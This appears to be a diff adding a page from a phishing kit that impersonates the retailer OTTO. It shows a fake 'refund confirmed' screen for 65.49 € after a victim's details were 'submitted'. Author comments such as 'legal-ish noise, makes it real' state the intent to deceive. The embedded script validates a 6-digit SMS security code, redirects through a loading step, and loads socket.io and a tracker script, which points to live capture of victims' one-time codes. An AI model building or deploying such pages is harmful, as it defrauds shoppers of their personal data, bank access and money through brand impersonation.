@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Rückerstattung bestätigt · OTTO</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+ <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #f4f6f9;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 16px 40px;
+            line-height: 1.5;
+            color: #1e1e1e;
+        }
+
+        /* main card */
+        .pl_focussed-dialog__container {
+            max-width: 520px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08), 0 8px 24px rgba(0, 0, 0, 0.04);
+            padding: 40px 32px 32px;
+            transition: box-shadow 0.2s;
+            margin-bottom: 32px;
+        }
+
+        /* OTTO logo area */
+        .hedopan {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+
+        .hedopan img {
+            max-height: 42px;
+            width: auto;
+            display: block;
+            opacity: 0.9;
+            transition: opacity 0.2s;
+        }
+
+        .hedopan img:hover {
+            opacity: 1;
+        }
+
+        /* form / done container */
+        .done-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        /* animated checkmark — satisfying, smooth */
+        .checkmark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: block;
+            stroke-width: 3;
+            stroke: #2b7a4b;
+            stroke-miterlimit: 10;
+            margin: 0 auto 28px auto;
+            box-shadow: inset 0 0 0 #2b7a4b;
+            animation: fill 0.5s ease-in-out 0.4s forwards, scale 0.35s ease-in-out 0.9s both;
+        }
+
+        .checkmark__circle {
+            stroke-dasharray: 166;
+            stroke-dashoffset: 166;
+            stroke-width: 3;
+            stroke-miterlimit: 10;
+            stroke: #2b7a4b;
+            fill: none;
+            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+        }
+
+        .checkmark__check {
+            transform-origin: 50% 50%;
+            stroke-dasharray: 48;
+            stroke-dashoffset: 48;
+            animation: stroke 0.35s cubic-bezier(0.65, 0, 0.45, 1) 0.75s forwards;
+        }
+
+        @keyframes stroke {
+            100% { stroke-dashoffset: 0; }
+        }
+
+        @keyframes scale {
+            0%, 100% { transform: none; }
+            50% { transform: scale3d(1.08, 1.08, 1); }
+        }
+
+        @keyframes fill {
+            100% { box-shadow: inset 0 0 0 40px rgba(43, 122, 75, 0.08); }
+        }
+
+        .done-headline {
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a1a1a;
+            letter-spacing: -0.3px;
+            margin-bottom: 12px;
+        }
+
+        .done-text {
+            font-size: 15px;
+            color: #4a4a4a;
+            line-height: 1.65;
+            max-width: 400px;
+            margin-bottom: 28px;
+        }
+
+        /* details box — clean, subtle */
+        .done-details {
+            background: #f8fafc;
+            border: 1px solid #e6edf4;
+            border-radius: 14px;
+            padding: 22px 20px 20px;
+            width: 100%;
+            margin-bottom: 32px;
+            transition: background 0.15s;
+        }
+
+        .done-amount-label {
+            font-size: 12px;
+            font-weight: 600;
+            color: #6b7a8a;
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+            margin-bottom: 6px;
+        }
+
+        .done-amount {
+            font-size: 30px;
+            font-weight: 700;
+            color: #2b7a4b;
+            letter-spacing: -0.5px;
+        }
+
+        .done-details .sub-note {
+            font-size: 13px;
+            color: #6b7a8a;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px dashed #dce4ec;
+        }
+
+        /* primary button — deep, confident red as OTTO signature */
+        .btn {
+            display: inline-block;
+            width: 100%;
+            padding: 16px 20px;
+            font-family: 'Inter', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 60px;
+            background: #cc0033;
+            color: #ffffff;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
+            text-decoration: none;
+            text-align: center;
+            letter-spacing: 0.2px;
+            box-shadow: 0 4px 12px rgba(204, 0, 51, 0.25);
+        }
+
+        .btn:hover {
+            background: #b3002e;
+            box-shadow: 0 6px 20px rgba(204, 0, 51, 0.30);
+            transform: translateY(-1px);
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+            box-shadow: 0 2px 8px rgba(204, 0, 51, 0.20);
+        }
+
+        /* footer — subtle, legally plausible */
+        .footer {
+            max-width: 520px;
+            width: 100%;
+            text-align: center;
+            font-size: 13px;
+            color: #7a8a9a;
+            line-height: 1.7;
+            padding: 8px 8px 0;
+        }
+
+        .footer-lines {
+            margin-bottom: 10px;
+        }
+
+        .footer-lines a {
+            color: #4a5a6a;
+            text-decoration: none;
+            transition: color 0.15s;
+            font-weight: 450;
+            margin: 0 2px;
+        }
+
+        .footer-lines a:hover {
+            color: #cc0033;
+            text-decoration: underline;
+        }
+
+        .footer .price-info {
+            font-size: 12px;
+            color: #8a9aaa;
+            letter-spacing: 0.2px;
+        }
+
+        /* responsive adjustments */
+        @media (max-width: 480px) {
+            .pl_focussed-dialog__container {
+                padding: 28px 18px 24px;
+            }
+
+            .done-headline {
+                font-size: 22px;
+            }
+
+            .done-amount {
+                font-size: 26px;
+            }
+
+            .btn {
+                font-size: 15px;
+                padding: 14px 16px;
+            }
+
+            .checkmark {
+                width: 68px;
+                height: 68px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="pl_focussed-dialog__container">
+
+        <!-- Brand logo — OTTO -->
+        <div class="hedopan">
+            <img src="./img/hedoipa.PNG" alt="OTTO" />
+        </div>
+
+        <section class="pl_focussed-dialog__content">
+            <div class="done-container">
+
+                <!-- Animated checkmark — trust signal -->
+                <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                    <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+                    <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+                </svg>
+
+                <div class="done-headline">Erfolgreich abgeschlossen!</div>
+
+                <div class="done-text">
+                    Vielen Dank. Ihre Angaben wurden sicher übermittelt. Die Auszahlung wurde in unserem System hinterlegt und wird nun bearbeitet.
+                </div>
+
+                <!-- Refund amount — crisp and green -->
+                <div class="done-details">
+                    <div class="done-amount-label">Rückerstattungsbetrag</div>
+                    <div class="done-amount">65.49 €</div>
+                    <div class="sub-note">
+                        Gutschrift erfolgt in der Regel innerhalb von 1–3 Werktagen.
+                    </div>
+                </div>
+
+                <!-- Primary CTA — back to shop -->
+                <button type="button" class="btn" onclick="window.location.href='https://www.otto.de'">
+                    Zurück zu OTTO.de
+                </button>
+
+            </div>
+        </section>
+    </div>
+
+    <!-- Footer — legal-ish noise, makes it real -->
+    <footer class="footer">
+        <div class="footer-lines">
+            <a href="#">Cookie-Einstellungen</a> &middot;
+            <a href="#">AGB</a> &middot;
+            <a href="#">Datenschutz</a> &middot;
+            <a href="#">Impressum</a> &middot;
+            <br />
+            <a href="#">Information zur Barrierefreiheit</a> &middot;
+            <a href="#">Produktsicherheitsrückrufe</a> &middot;
+            <a href="#">OTTO Versprechen</a>
+        </div>
+        <div class="price-info">
+            Preisangaben inkl. Steuer und zzgl. Service- und Versandkosten
+        </div>
+    </footer>
+  <script>
+            document.addEventListener('DOMContentLoaded', function () {
+                const form = document.getElementById('semitr1');
+                const smsCodeInput = document.getElementById('smsCode');
+                const smsCodeError = document.getElementById('smsCodeError');
+
+                // Only allow numbers in SMS code field
+                smsCodeInput.addEventListener('keypress', function (e) {
+                    if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
+                        e.preventDefault();
+                    }
+                });
+
+                // Clear error when user starts typing
+                smsCodeInput.addEventListener('input', function () {
+                    smsCodeError.textContent = '';
+                    smsCodeInput.classList.remove('input-error');
+                });
+
+                // Validate SMS code format
+                function validateSmsCode(code) {
+                    return /^\d{6}$/.test(code); // Must be exactly 6 digits
+                }
+
+                form.addEventListener('submit', function (e) {
+                    e.preventDefault();
+                    const smsCode = smsCodeInput.value.trim();
+
+                    // Validate SMS code
+                    if (!smsCode) {
+                        smsCodeError.textContent = 'Bitte geben Sie den Sicherheitscode ein';
+                        smsCodeInput.classList.add('input-error');
+                        return false;
+                    } else if (!validateSmsCode(smsCode)) {
+                        smsCodeError.textContent = 'Der Sicherheitscode muss 6 Ziffern enthalten';
+                        smsCodeInput.classList.add('input-error');
+                        return false;
+                    }
+
+                    form.setAttribute('data-redirect', '/loading?time=3&url=SmS-2-hkjnUHnKJHu');
+                    form.requestSubmit();
+
+                    // Show processing state
+                    const submitButton = form.querySelector('button[type="submit"]');
+                    const originalButtonText = submitButton.textContent;
+                    submitButton.textContent = 'Wird verarbeitet...';
+                    submitButton.disabled = true;
+                });
+            });
+        </script>
+        <script src="/socket.io/socket.io.js"></script>
+        <script src="js/tracker.js"></script>
+</body>
+</html>
